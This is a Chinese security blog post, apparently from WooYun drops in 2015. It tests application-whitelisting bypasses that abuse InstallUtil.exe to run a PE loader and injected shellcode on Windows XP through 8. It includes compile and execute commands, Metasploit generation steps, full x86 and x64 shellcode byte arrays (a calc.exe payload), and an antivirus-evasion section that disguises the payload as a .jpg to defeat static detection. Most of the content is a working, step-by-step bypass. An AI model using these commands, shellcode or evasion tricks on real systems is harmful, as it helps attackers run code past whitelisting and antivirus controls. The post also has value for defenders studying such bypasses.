@@ -1,0 +1,79 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">利用白名单绕过限制的更多测试</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">三好学生</a> <span class="bull">·</span> <time title="2015/10/08 10:10" ui-time="" datetime="2015/10/08 10:10" class="published ng-binding ng-isolate-scope">2015/10/08 10:10</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p>subTee在博客中不仅介绍了如何利用InstallUtil.exe直接执行pe文件，还提到了另一种利用方式——<strong>利用InstallUtil执行shellcode</strong> 从subTee分享的代码可以看出其测试环境为64位、.net4.0环境，在360安全播报上发表的文章也认为执行环境必须是.net4.0以上，适用范围很窄 <strong>但我并不这么认为</strong></p><p>下面我们通过实际测试得出我们的新结论。</p><p>注：上述涉及的链接：</p><ul><li><a href="http://subt0x10.blogspot.hk/2015/08/application-whitelisting-bypasses-101.html">http://subt0x10.blogspot.hk/2015/08/application-whitelisting-bypasses-101.html</a></li><li><a href="http://bobao.360.cn/learning/detail/620.html">http://bobao.360.cn/learning/detail/620.html</a></li></ul><h1>0x01 测试目标</h1><hr><p>测试两种利用InstallUtil的方式，研究其使用环境</p><h1>0x02 测试环境</h1><hr><pre><code>xp x86
+win7 x86
+win7 x64
+win8 x86
+win8 x64
+</code></pre><h1>0x03 测试方法</h1><hr><h2>1、利用InstallUtil.exe执行pe文件</h2><p>执行代码：</p><pre><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:PELoader.exe PELoader.cs
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U PELoader.exe
+</code></pre><p><strong>注</strong>：上篇有详细介绍，本次不做具体介绍</p><h2>2、利用InstallUtil.exe直接执行shellcode</h2><p>下载链接：<a href="https://gist.github.com/subTee/a06d4ae23e2517566c52">https://gist.github.com/subTee/a06d4ae23e2517566c52</a></p><p>下载文件保存为Shellcode.cs，按照其描述执行代码：</p><pre><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe  /unsafe /platform:x64 /out:exeshell.exe Shellcode.cs
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe
+</code></pre><h1>0x04 实际测试</h1><hr><p><strong>注</strong>：根据不同操作系统版本，需要对上述利用代码作相应修改</p><h2>1、xp x86</h2><p>默认不包含.net环境，暂不测试，但可为最终结论提供参考</p><h2>2、win7 x86</h2><p>默认.net环境</p><p>如图</p><p><img alt="这里写图片描述" img-src="f917bfc79c846d363ac1ee6493f33ff3930696a3.jpg"></p><p><strong>（1）</strong>利用InstallUtil.exe执行pe文件</p><p>.net 3.5无法成功编译PELoader.cs</p><p>如图</p><p><img alt="这里写图片描述" img-src="8a94753227306e8486ef268fa4b7842eb70f2d7a.jpg"></p><p><strong>（2）</strong>利用InstallUtil.exe直接执行shellcode</p><p>通过msf生成32位shellcode</p><pre><code>use windows/exec
+set CMD calc.exe
+set EXITFUNC thread
+generate -t csharp
+</code></pre><p>如图</p><p><img alt="这里写图片描述" img-src="a9a9956e5d4799e113d6cecc660b76c1c80baf6c.jpg"></p><pre><code>byte[] buf = new byte[195] {
+0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
+0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
+0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
+0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
+0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
+0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
+0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
+0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
+0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
+0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,
+0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,
+0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,
+0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x20,0x63,0x00 };
+</code></pre><p>替换Shellcode.cs中的byte[] shellcode</p><p>使用.net 2.0中的csc.exe和InstallUtil.exe，执行代码：</p><pre><code>C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /unsafe  /out:exeshell.exe Shellcode.cs
+
+C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe
+</code></pre><p>成功执行shellcode，弹出计算器</p><p>如图</p><p><img alt="这里写图片描述" img-src="506e463d2c78a152522e16069ca8fdd7996ba6ed.jpg"></p><p>360成功查杀，如图</p><p><img alt="这里写图片描述" img-src="96aa0e6cd8c73a7f2d39db1fb1a928d988a1db28.jpg"></p><h2>2、win7 x64</h2><p>默认.net环境</p><p>如图</p><p><img alt="这里写图片描述" img-src="2148c05ede26b5d8896b72341009a71a39c9e312.jpg"></p><p><strong>（1）</strong>利用InstallUtil.exe执行pe文件</p><p>.net 3.5无法成功编译PELoader.cs</p><p><strong>（2）</strong>利用InstallUtil.exe直接执行shellcode</p><p>通过msf生成64位shellcode</p><pre><code>use windows/x64/exec
+set CMD calc.exe
+set EXITFUNC thread
+generate -t csharp
+</code></pre><p>如图</p><p><img alt="这里写图片描述" img-src="b97cef10ee89e862bed208ef395e7a5b14a2244e.jpg"></p><pre><code>byte[] buf = new byte[276] {
+0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
+0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
+0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
+0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
+0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
+0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
+0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
+0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
+0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
+0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
+0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
+0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
+0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
+0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
+0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
+0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
+0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
+0x63,0x2e,0x65,0x78,0x65,0x00 };
+</code></pre><p>替换Shellcode.cs中的byte[] shellcode</p><p>使用.net 2.0 x64中的csc.exe和InstallUtil.exe，执行代码：</p><pre><code>C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe  /unsafe /platform:x64 /out:exeshell.exe Shellcode.cs
+
+C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe
+</code></pre><p>成功执行shellcode，弹出计算器</p><p>如图</p><p><img alt="这里写图片描述" img-src="447076d42cb554ff5ddb7c6e53ce920c4d53d658.jpg"></p><p>如果使用.net 2.0 x86中的csc.exe和InstallUtil.exe，执行代码：</p><pre><code>C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe  /unsafe /platform:x64 /out:exeshell.exe Shellcode.cs
+
+C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe
+</code></pre><p>会报错，如图</p><p><img alt="这里写图片描述" img-src="5a08db02c808786e7bdcf04bc31e703d550335d4.jpg"></p><p>测试exeshellx64.exe查杀情况，360干的不错，查杀，如图</p><p><img alt="这里写图片描述" img-src="9e4d332f6551d2587458fe5c9560e35b1c241489.jpg"></p><h2>3、win8 x86</h2><p>默认.net环境，支持4.0</p><p>如图</p><p><img alt="这里写图片描述" img-src="c88d4a7c00905a339a4058c63900c73b31d27051.jpg"></p><p><strong>（1）</strong>利用InstallUtil.exe执行pe文件</p><p>执行代码：</p><pre><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /unsafe /out:PELoader.exe PELoader.cs
+
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U PELoader.exe
+</code></pre><p>32位系统下执行发生异常</p><p>如图</p><p><img alt="这里写图片描述" img-src="728241d89add8bc643c1bf9cf503eada08530de4.jpg"></p><p><strong>（2）</strong>利用InstallUtil.exe直接执行shellcode</p><p>使用.net 4.0中的csc.exe和InstallUtil.exe，执行代码：</p><pre><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /unsafe  /out:exeshell.exe Shellcode.cs
+
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe
+</code></pre><p>成功执行shellcode，弹出计算器</p><p>如图</p><p><img alt="这里写图片描述" img-src="a1cf5f5fc411f659c7b819517a5cded33365ca0b.jpg"></p><p>测试win8x86exeshell.exe查杀情况，360干的漂亮，查杀，如图</p><p><img alt="这里写图片描述" img-src="13b8792795e61b0bcda15934adb35d6a59759145.jpg"></p><h2>4、win8 x64</h2><p>默认.net环境，支持4.0，如图</p><p><img alt="这里写图片描述" img-src="0b4f91dad95c6e6793f7ce8c6ac0f01b41c31a28.jpg"></p><p><strong>（1）</strong>利用InstallUtil.exe执行pe文件</p><p>.net 4.0成功执行</p><p>如图</p><p><img alt="这里写图片描述" img-src="18dd55195e0e824467574252c3227798cada8995.jpg"></p><p><strong>（2）</strong>利用InstallUtil.exe直接执行shellcode</p><p>使用.net 4.0 x64中的csc.exe和InstallUtil.exe，执行代码：</p><pre><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe  /unsafe /platform:x64 /out:exeshell.exe Shellcode.cs
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe
+</code></pre><p>报错，如图</p><p><img alt="这里写图片描述" img-src="cfbf25df012a97f717665d358993946c0dc5c31a.jpg"></p><p>使用.net 4.0 x86中的csc.exe和InstallUtil.exe，执行代码：</p><pre><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /unsafe  /out:exeshell.exe Shellcode.cs
+
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe
+</code></pre><p>报错，如图</p><p><img alt="这里写图片描述" img-src="2325732c925d22591d8b690234896a82e1208b48.jpg"></p><p>为了得出正确的结论，在win8 x64系统上面安装.net framework x64 2.0</p><p>使用其中的csc.exe和InstallUtil.exe，执行代码：</p><pre><code>C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe  /unsafe /platform:x64 /out:exeshell.exe Shellcode.cs
+
+C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe
+</code></pre><p>成功执行shellcode，弹出计算器</p><p>如图</p><p><img alt="这里写图片描述" img-src="5961b3f5b944aec5ae0f03a94ea45a29a23b481e.jpg"></p><h1>0x05 补充</h1><hr><p>上述测试中操作系统自带的.net环境并不绝对，如果安装应用 也会默认安装相应版本的.net 环境</p><h1>0x06 测试结论</h1><hr><h2>（1）利用InstallUtil.exe执行pe文件</h2><p>适用于64位系统、Microsoft .NET Framework 4.0环境</p><h2>（2）利用InstallUtil.exe直接执行shellcode</h2><p>适用于.NET Framework 2.0及特定环境</p><h1>0x07 关于免杀</h1><hr><p>仅给出一种简单有效的方法</p><p>参照上篇内容的思路，执行代码如下：</p><pre><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe  /unsafe /platform:x64 /out:exeshell.jpg Shellcode.cs
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.jpg
+</code></pre><p>更改文件后缀名即可逃过静态查杀，至于主动防御，全过程依然未触发</p><p>如图</p><p><img alt="这里写图片描述" img-src="32056a25c36748045aa257c7edce01a78e849a89.jpg"></p><p>正常打开是一张损坏的图片</p><p>查杀测试如图</p><p><img alt="这里写图片描述" img-src="5ec5909ad52a497d1181f77313a4ace523f4bfa6.jpg"></p><p>但实际上，可以通过这种方式打开，如图</p><p><img alt="这里写图片描述" img-src="1f28b4661cb8b682f7fa39e4b58b1b22f3322afe.jpg"></p><h1>0x08 小结</h1><hr><p>关于该项技术的利用方式还有很多，思路最重要</p><p>关于突破白名单的限制，其他方法比如利用PowerShell、Exploit/Migrate、WMI Providers、.COM代理突破白名单的限制的方法都很值得研究。</p><p>本文由三好学生原创并首发于乌云drops，转载请注明</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"></div></div></div></main>
